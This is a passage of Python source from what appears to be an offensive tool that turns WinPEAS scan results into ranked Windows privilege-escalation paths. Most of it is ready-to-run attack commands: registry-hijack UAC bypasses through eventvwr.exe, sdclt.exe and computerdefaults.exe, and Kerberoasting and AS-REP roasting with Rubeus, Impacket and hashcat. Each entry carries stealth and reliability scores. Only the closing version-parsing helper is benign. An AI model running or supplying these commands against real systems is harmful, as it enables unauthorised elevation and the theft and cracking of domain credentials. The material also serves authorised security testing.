                    "reg delete HKCU\\Software\\Classes\\ms-settings /f"
                ],
            },
            "eventvwr.exe": {
                "description": "UAC bypass via eventvwr.exe registry hijack",
                "commands": [
                    "# Set registry key:",
                    "reg add HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command /d \"cmd.exe /c start cmd.exe\" /f",
                    "# Trigger:",
                    "eventvwr.exe",
                    "# Cleanup:",
                    "reg delete HKCU\\Software\\Classes\\mscfile /f"
                ],
            },
            "sdclt.exe": {
                "description": "UAC bypass via sdclt.exe registry hijack",
                "commands": [
                    "# Set registry key:",
                    "reg add HKCU\\Software\\Classes\\Folder\\Shell\\Open\\command /d \"cmd.exe /c start cmd.exe\" /f",
                    "reg add HKCU\\Software\\Classes\\Folder\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
                    "# Trigger:",
                    "sdclt.exe",
                    "# Cleanup:",
                    "reg delete HKCU\\Software\\Classes\\Folder /f"
                ],
            },
            "computerdefaults.exe": {
                "description": "UAC bypass via computerdefaults.exe registry hijack",
                "commands": [
                    "# Set registry key:",
                    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe /c start cmd.exe\" /f",
                    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f",
                    "# Trigger:",
                    "computerdefaults.exe",
                    "# Cleanup:",
                    "reg delete HKCU\\Software\\Classes\\ms-settings /f"
                ],
            },
        }

        uac_confidence = Confidence.HIGH if is_admin else Confidence.MEDIUM

        for technique_name, uac_info in uac_techniques.items():
            path = ExploitationPath(
                category=Category.UAC,
                technique_name=f"UAC Bypass: {technique_name}",
                description=str(uac_info["description"]),
                finding=f"Integrity: {integrity_level or 'Medium (assumed)'}, Admin group: {is_admin}",
                commands=list(uac_info["commands"]),
                prerequisites=["Medium integrity level", "User in Administrators group"],
                confidence=uac_confidence,
                risk=Risk.LOW,
                references=["https://github.com/hfiref0x/UACME"],
                reliability_score=85,
                safety_score=85,
                simplicity_score=85,
                stealth_score=55
            )
            paths.append(path)

        return paths

    def _analyze_ad_kerberos(self, results: WinPEASResults) -> list[ExploitationPath]:
        """Analyze Active Directory and Kerberos attack opportunities."""
        paths: list[ExploitationPath] = []

        domain_joined = getattr(results, 'domain_joined', False)
        if not domain_joined:
            return paths

        domain_name = getattr(results, 'domain_name', 'DOMAIN')

        # Kerberoasting
        paths.append(ExploitationPath(
            category=Category.CREDENTIALS,
            technique_name="Kerberoasting (Domain Joined)",
            description="Machine is domain-joined. Kerberoastable service accounts may yield crackable TGS tickets.",
            finding=f"Domain: {domain_name}",
            commands=[
                "# Rubeus (from target):",
                "Rubeus.exe kerberoast /outfile:kerberoast.txt",
                "# Impacket (from attacker):",
                f"impacket-GetUserSPNs {domain_name}/USER:PASSWORD -dc-ip DC_IP -request",
                "# Crack with hashcat:",
                "hashcat -m 13100 kerberoast.txt wordlist.txt"
            ],
            prerequisites=["Valid domain credentials"],
            confidence=Confidence.MEDIUM,
            risk=Risk.LOW,
            references=[
                "https://attack.mitre.org/techniques/T1558/003/"
            ],
            reliability_score=70,
            safety_score=85,
            simplicity_score=75,
            stealth_score=50
        ))

        # AS-REP Roasting
        paths.append(ExploitationPath(
            category=Category.CREDENTIALS,
            technique_name="AS-REP Roasting (Domain Joined)",
            description="Check for accounts with Kerberos pre-authentication disabled.",
            finding=f"Domain: {domain_name}",
            commands=[
                "# Rubeus (from target):",
                "Rubeus.exe asreproast /outfile:asrep.txt",
                "# Impacket (from attacker):",
                f"impacket-GetNPUsers {domain_name}/ -dc-ip DC_IP -usersfile users.txt -no-pass",
                "# Crack with hashcat:",
                "hashcat -m 18200 asrep.txt wordlist.txt"
            ],
            prerequisites=["User list or valid domain credentials"],
            confidence=Confidence.MEDIUM,
            risk=Risk.LOW,
            references=[
                "https://attack.mitre.org/techniques/T1558/004/"
            ],
            reliability_score=60,
            safety_score=90,
            simplicity_score=70,
            stealth_score=60
        ))

        # BloodHound enumeration
        paths.append(ExploitationPath(
            category=Category.CREDENTIALS,
            technique_name="BloodHound AD Enumeration",
            description="Run BloodHound/SharpHound to map AD attack paths and find privilege escalation routes.",
            finding=f"Domain: {domain_name}",
            commands=[
                "# SharpHound (from target):",
                "SharpHound.exe -c All --outputdirectory C:\\temp",
                "# BloodHound Python (from attacker):",
                f"bloodhound-python -u USER -p PASSWORD -d {domain_name} -dc DC_IP -c All",
                "# Import .zip into BloodHound GUI and check:",
                "# - Shortest path to Domain Admin",
                "# - Kerberoastable users",
                "# - Users with DCSync rights"
            ],
            prerequisites=["Valid domain credentials"],
            confidence=Confidence.HIGH,
            risk=Risk.LOW,
            notes="BloodHound is an enumeration tool, not an exploit. Use results to identify attack paths.",
            reliability_score=90,
            safety_score=90,
            simplicity_score=65,
            stealth_score=40
        ))

        return paths

    def _version_in_range(self, version: str, min_ver: str, max_ver: str) -> bool:
        """Check if version is within the specified range.

        Args:
            version: Version to check (e.g., "5.10.0")
            min_ver: Minimum version (inclusive)
            max_ver: Maximum version (inclusive)

        Returns:
            True if version is in range
        """
        # Handle "all" sentinel (e.g., PwnKit affects all versions)
        if min_ver == "all" and max_ver == "all":
            return True

        def parse_version(v: str) -> tuple[int, ...]:
            """Parse version string to tuple of integers.

            Handles suffixes like '0-42-generic' by splitting each dot-separated
            component on '-' and taking only the leading numeric part.
            """
            # Split on dots, then strip any trailing non-numeric suffix from each component
            components = v.split(".")
            parts = []
            for component in components:
                # Take only the part before any dash (e.g. "0-42-generic" -> "0")
                numeric_part = component.split("-")[0]
                if numeric_part.isdigit():
                    parts.append(int(numeric_part))
            if not parts:
                raise ValueError(f"No numeric parts in version: {v}")
            # Pad to minimum 3 parts so (5, 10) becomes (5, 10, 0)
            while len(parts) < 3:
                parts.append(0)
            return tuple(parts[:4])  # Limit to 4 parts

        try:
            ver = parse_version(version)
            min_v = parse_version(min_ver)
            max_v = parse_version(max_ver)

            return min_v <= ver <= max_v
        except (ValueError, IndexError):
            return False
